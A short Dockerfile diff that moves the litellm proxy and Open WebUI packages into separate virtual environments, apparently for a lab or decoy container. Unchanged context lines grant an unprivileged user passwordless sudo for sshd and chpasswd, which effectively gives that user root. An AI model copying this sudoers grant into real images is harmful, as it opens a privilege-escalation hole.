@@ -38,7 +38,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 
 # Install AI dependencies using uv
 RUN uv pip install --system --break-system-packages --no-cache-dir \
-    gradio huggingface_hub loguru urllib3 "litellm[proxy]" open-webui
+    gradio huggingface_hub loguru urllib3
 
 # Download a tiny model config for mimicry
 RUN python3 -c "from huggingface_hub import hf_hub_download; hf_hub_download(repo_id='gpt2', filename='config.json')"
@@ -51,6 +51,15 @@ RUN userdel -f ubuntu && useradd -m -u 1000 -s /bin/bash user && \
     chown -R user:user /home/user/.torch_metrics && \
     echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers && \
     echo "user ALL=(ALL) NOPASSWD: /usr/bin/neural-route-controller" >> /etc/sudoers
+
+# Create isolated virtual environments to resolve package version conflicts
+RUN uv venv /opt/venv-litellm && \
+    uv pip install --python /opt/venv-litellm --no-cache-dir "litellm[proxy]" && \
+    chown -R user:user /opt/venv-litellm
+
+RUN uv venv /opt/venv-openwebui && \
+    uv pip install --python /opt/venv-openwebui --no-cache-dir open-webui && \
+    chown -R user:user /opt/venv-openwebui
 
 # Copy application files
 COPY --chown=user:user src/app.py /home/user/app.py
